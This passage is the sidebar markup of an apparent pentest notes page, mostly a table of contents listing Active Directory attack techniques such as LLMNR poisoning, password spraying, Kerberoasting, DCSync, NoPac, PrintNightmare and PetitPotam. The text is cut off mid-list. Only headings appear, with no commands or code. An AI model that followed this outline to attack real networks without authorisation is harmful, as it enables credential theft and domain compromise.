		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-11-20 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Pentest/">Pentest<span>16</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Host-Enumeration"><span class="toc-article-text">Host Enumeration</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Passive"><span class="toc-article-text">Passive</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Wireshark"><span class="toc-article-text">Wireshark</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Tcpdump"><span class="toc-article-text">Tcpdump</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Responder"><span class="toc-article-text">Responder</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Active"><span class="toc-article-text">Active</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#FPing"><span class="toc-article-text">FPing</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap"><span class="toc-article-text">nmap</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#script"><span class="toc-article-text">script</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#LLMNR-NBT-NS-Poisoning"><span class="toc-article-text">LLMNR&#x2F;NBT-NS Poisoning</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Linux"><span class="toc-article-text">Linux</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Responder-1"><span class="toc-article-text">Responder</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Windows"><span class="toc-article-text">Windows</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Inveigh"><span class="toc-article-text">Inveigh</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#C-Inveigh-InveighZero"><span class="toc-article-text">C# Inveigh (InveighZero)</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#User-Enumeration"><span class="toc-article-text">User Enumeration</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SMB"><span class="toc-article-text">SMB</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#rpcclient"><span class="toc-article-text">rpcclient</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum4linux"><span class="toc-article-text">enum4linux</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum4linux-ng"><span class="toc-article-text">enum4linux-ng</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CrackMapExec"><span class="toc-article-text">CrackMapExec</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#LDAP"><span class="toc-article-text">LDAP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ldapsearch"><span class="toc-article-text">ldapsearch</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#windapsearch"><span class="toc-article-text">windapsearch</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Kerberos"><span class="toc-article-text">Kerberos</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Kerbrute"><span class="toc-article-text">Kerbrute</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Password-Spraying"><span class="toc-article-text">Password Spraying</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#From-Linux"><span class="toc-article-text">From Linux</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#rpcclient-bash-script"><span class="toc-article-text">rpcclient &amp; bash script</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Kerbrute-1"><span class="toc-article-text">Kerbrute</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CrackMapExec-1"><span class="toc-article-text">CrackMapExec</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#From-Windows"><span class="toc-article-text">From Windows</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DomainPasswordSpray-ps1"><span class="toc-article-text">DomainPasswordSpray.ps1</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Credentialed-Enumeration"><span class="toc-article-text">Credentialed Enumeration</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CrackMapExec-2"><span class="toc-article-text">CrackMapExec</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Domain-User-enum"><span class="toc-article-text">Domain User enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Domain-Group-enum"><span class="toc-article-text">Domain Group enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#loggedon"><span class="toc-article-text">loggedon</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#share-enum"><span class="toc-article-text">share enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#share-spider"><span class="toc-article-text">share spider</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SMBmap"><span class="toc-article-text">SMBmap</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#smbclient"><span class="toc-article-text">smbclient</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum"><span class="toc-article-text">enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#download"><span class="toc-article-text">download</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#rpcclient-1"><span class="toc-article-text">rpcclient</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-1"><span class="toc-article-text">enum</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Impacket-Toolkit"><span class="toc-article-text">Impacket Toolkit</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#psexec-py"><span class="toc-article-text">psexec.py</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wmiexec-py"><span class="toc-article-text">wmiexec.py</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#windapsearch-1"><span class="toc-article-text">windapsearch</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-2"><span class="toc-article-text">enum</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#BloodHound"><span class="toc-article-text">BloodHound</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#SharpHound-exe"><span class="toc-article-text">SharpHound.exe</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#bloodhound-python"><span class="toc-article-text">bloodhound-python</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#upload"><span class="toc-article-text">upload</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell"><span class="toc-article-text">PowerShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-Module"><span class="toc-article-text">Get-Module</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ActiveDirectory-Module"><span class="toc-article-text">ActiveDirectory Module</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-ADDomain"><span class="toc-article-text">Get-ADDomain</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-ADUser"><span class="toc-article-text">Get-ADUser</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-ADTrust"><span class="toc-article-text">Get-ADTrust</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-ADGroup"><span class="toc-article-text">Get-ADGroup</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-ADGroupMember"><span class="toc-article-text">Get-ADGroupMember</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerView"><span class="toc-article-text">PowerView</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-DomainUser"><span class="toc-article-text">Get-DomainUser</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-DomainGroupMember"><span class="toc-article-text">Get-DomainGroupMember</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-DomainTrustMapping"><span class="toc-article-text">Get-DomainTrustMapping</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Test-AdminAccess"><span class="toc-article-text">Test-AdminAccess</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SharpView"><span class="toc-article-text">SharpView</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Snaffler"><span class="toc-article-text">Snaffler</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Living-Off-The-Land"><span class="toc-article-text">Living Off The Land</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Basic-enum"><span class="toc-article-text">Basic enum</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Basic-Command"><span class="toc-article-text">Basic Command</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerShell-1"><span class="toc-article-text">PowerShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Powershell-downgrade"><span class="toc-article-text">Powershell downgrade</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Firewall"><span class="toc-article-text">Firewall</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#netsh"><span class="toc-article-text">netsh</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#sc"><span class="toc-article-text">sc</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Get-MpComputerStatus"><span class="toc-article-text">Get-MpComputerStatus</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#qwinsta"><span class="toc-article-text">qwinsta</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Network-Information"><span class="toc-article-text">Network Information</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#WMI"><span class="toc-article-text">WMI</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Credential-enum"><span class="toc-article-text">Credential enum</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#net"><span class="toc-article-text">net</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Dsquery"><span class="toc-article-text">Dsquery</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#users"><span class="toc-article-text">users</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#computers"><span class="toc-article-text">computers</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#wildcard"><span class="toc-article-text">wildcard</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#users-filter-PASSWD-NOTREQD"><span class="toc-article-text">users filter (PASSWD_NOTREQD)</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#DC"><span class="toc-article-text">DC</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Kerberoasting"><span class="toc-article-text">Kerberoasting</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#GetUserSPNs-py-From-Linux"><span class="toc-article-text">GetUserSPNs.py - From Linux</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Semi-Manual-From-Windows"><span class="toc-article-text">Semi Manual - From Windows</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#setspn-exe"><span class="toc-article-text">setspn.exe</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#System-IdentityModel"><span class="toc-article-text">System.IdentityModel</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Mimikatz"><span class="toc-article-text">Mimikatz</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Automated-Tool-Based-Route"><span class="toc-article-text">Automated &#x2F; Tool Based Route</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerView-1"><span class="toc-article-text">PowerView</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#enum-3"><span class="toc-article-text">enum</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ticket"><span class="toc-article-text">ticket</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Rubeus"><span class="toc-article-text">Rubeus</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#request-ticket"><span class="toc-article-text">request ticket</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ACL-Enumeration"><span class="toc-article-text">ACL Enumeration</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerView-2"><span class="toc-article-text">PowerView</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Find-InterestingDomainAcl"><span class="toc-article-text">Find-InterestingDomainAcl</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Get-DomainObjectACL"><span class="toc-article-text">Get-DomainObjectACL</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Get-Acl-Get-ADUser"><span class="toc-article-text">Get-Acl &amp; Get-ADUser</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-ACLs"><span class="toc-article-text">enum ACLs</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#BloodHound-1"><span class="toc-article-text">BloodHound</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#ACL-Abuse"><span class="toc-article-text">ACL Abuse</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ForceChangePassword"><span class="toc-article-text">ForceChangePassword</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#GenericAll"><span class="toc-article-text">GenericAll</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Creating-a-Fake-SPN"><span class="toc-article-text">Creating a Fake SPN</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#kerberoasting"><span class="toc-article-text">kerberoasting</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-GetUserSPNs"><span class="toc-article-text">Impacket GetUserSPNs</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Rubeus-1"><span class="toc-article-text">Rubeus</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Cleanup"><span class="toc-article-text">Cleanup</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#remove-the-fake-SPN"><span class="toc-article-text">remove the fake SPN</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#remove-a-user-from-the-group"><span class="toc-article-text">remove a user from the group</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#change-password"><span class="toc-article-text">change password</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#DCSync"><span class="toc-article-text">DCSync</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#View-Replication-Privileges"><span class="toc-article-text">View Replication Privileges</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ADSI-edit"><span class="toc-article-text">ADSI edit</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PowerView-3"><span class="toc-article-text">PowerView</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DCSync-replication"><span class="toc-article-text">DCSync replication</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#secretsdump-py"><span class="toc-article-text">secretsdump.py</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Mimikatz-1"><span class="toc-article-text">Mimikatz</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Privileged-Access"><span class="toc-article-text">Privileged Access</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#RDP"><span class="toc-article-text">RDP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-4"><span class="toc-article-text">enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#connect"><span class="toc-article-text">connect</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#xfreerdp"><span class="toc-article-text">xfreerdp</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#mimikatz"><span class="toc-article-text">mimikatz</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#limit"><span class="toc-article-text">limit</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WinRM"><span class="toc-article-text">WinRM</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-5"><span class="toc-article-text">enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#connect-1"><span class="toc-article-text">connect</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Windows-PowerShell"><span class="toc-article-text">Windows - PowerShell</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Linux-evil-winrm"><span class="toc-article-text">Linux - evil-winrm</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#SQL-Server-Admin"><span class="toc-article-text">SQL Server Admin</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-6"><span class="toc-article-text">enum</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#BloodHound-2"><span class="toc-article-text">BloodHound</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PowerUpSQL"><span class="toc-article-text">PowerUpSQL</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#connect-2"><span class="toc-article-text">connect</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Windows-PowerUpSQL"><span class="toc-article-text">Windows - PowerUpSQL</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Linux-Impacket"><span class="toc-article-text">Linux - Impacket</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Kerberos-%E2%80%9CDouble-Hop%E2%80%9D"><span class="toc-article-text">Kerberos “Double Hop”</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Workarounds"><span class="toc-article-text">Workarounds</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Workaround-1-PSCredential-Object"><span class="toc-article-text">Workaround #1: PSCredential Object</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Workaround-2-Register-PSSession-Configuration"><span class="toc-article-text">Workaround #2: Register PSSession Configuration</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Bleeding-Edge-Vulnerabilities"><span class="toc-article-text">Bleeding Edge Vulnerabilities</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#NoPac-SamAccountName-Spoofing"><span class="toc-article-text">NoPac (SamAccountName Spoofing)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Scanning-for-NoPac"><span class="toc-article-text">Scanning for NoPac</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#NoPac-Getting-a-Shell"><span class="toc-article-text">NoPac &amp; Getting a Shell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#noPac-DCSync"><span class="toc-article-text">noPac DCSync</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PrintNightmare"><span class="toc-article-text">PrintNightmare</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-7"><span class="toc-article-text">enum</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#attack"><span class="toc-article-text">attack</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PetitPotam-MS-EFSRPC"><span class="toc-article-text">PetitPotam (MS-EFSRPC)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Intercept-Certificate"><span class="toc-article-text">Intercept Certificate</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Request-TGT"><span class="toc-article-text">Request TGT</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DCSync-using-TGT"><span class="toc-article-text">DCSync using TGT</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-secretsdump-py"><span class="toc-article-text">Impacket secretsdump.py</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#PKINITtools-getnthash-py"><span class="toc-article-text">PKINITtools getnthash.py</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#DCSync-1"><span class="toc-article-text">DCSync</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#NTLM-hash-for-DCSync"><span class="toc-article-text">NTLM hash for DCSync</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Mimikatz-performs-DCSync"><span class="toc-article-text">Mimikatz performs DCSync</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Miscellaneous-Misconfigurations"><span class="toc-article-text">Miscellaneous Misconfigurations</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Exchange-Related-Group-Membership"><span class="toc-article-text">Exchange Related Group Membership</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PrivExchange"><span class="toc-article-text">PrivExchange</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Printer-Bug"><span class="toc-article-text">Printer Bug</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#enum-8"><span class="toc-article-text">enum</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MS14-068"><span class="toc-article-text">MS14-068</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Sniffing-LDAP-Credentials"><span class="toc-article-text">Sniffing LDAP Credentials</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Enumerating-DNS-Records"><span class="toc-article-text">Enumerating DNS Records</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#adidnsdump"><span class="toc-article-text">adidnsdump</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Password-in-Description-Field"><span class="toc-article-text">Password in Description Field</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PASSWD-NOTREQD-Field"><span class="toc-article-text">PASSWD_NOTREQD Field</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Credentials-in-SMB-Shares-and-SYSVOL-Scripts"><span class="toc-article-text">Credentials in SMB Shares and SYSVOL Scripts</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Group-Policy-Preferences-GPP-Passwords"><span class="toc-article-text">Group Policy Preferences (GPP) Passwords</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Locating-Retrieving-GPP-Passwords-CrackMapExec"><span class="toc-article-text">Locating &amp; Retrieving GPP Passwords - CrackMapExec</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CrackMapExec%E2%80%99s-gpp-autologin-Module"><span class="toc-article-text">CrackMapExec’s gpp_autologin Module</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ASREPRoasting"><span class="toc-article-text">ASREPRoasting</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerView-Get-DomainUser"><span class="toc-article-text">PowerView Get-DomainUser</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Retrieve-AS-REP"><span class="toc-article-text">Retrieve AS-REP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Rubeus-2"><span class="toc-article-text">Rubeus</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Kerbrute-2"><span class="toc-article-text">Kerbrute</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Impacket-GetNPUsers-py"><span class="toc-article-text">Impacket GetNPUsers.py</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Group-Policy-Object-GPO-Abuse"><span class="toc-article-text">Group Policy Object (GPO) Abuse</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Enumerating-GPO-Names-PowerView"><span class="toc-article-text">Enumerating GPO Names - PowerView</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Enumerating-GPO-Names-Built-In-Cmdlet"><span class="toc-article-text">Enumerating GPO Names - Built-In Cmdlet</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Enumerating-Domain-User-GPO-Rights"><span class="toc-article-text">Enumerating Domain User GPO Rights</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Converting-GPO-GUID-to-Name"><span class="toc-article-text">Converting GPO GUID to Name</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Domain-Trusts"><span class="toc-article-text">Domain Trusts</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Enum-Trust-Relationships"><span class="toc-article-text">Enum Trust Relationships</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Powershell"><span class="toc-article-text">Powershell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Get-ADTrust-1"><span class="toc-article-text">Get-ADTrust</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Get-DomainUser-1"><span class="toc-article-text">Get-DomainUser</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PowerView-4"><span class="toc-article-text">PowerView</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Get-DomainTrust"><span class="toc-article-text">Get-DomainTrust</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#Get-DomainTrustMapping-1"><span class="toc-article-text">Get-DomainTrustMapping</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#netdom-query"><span class="toc-article-text">netdom query</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a 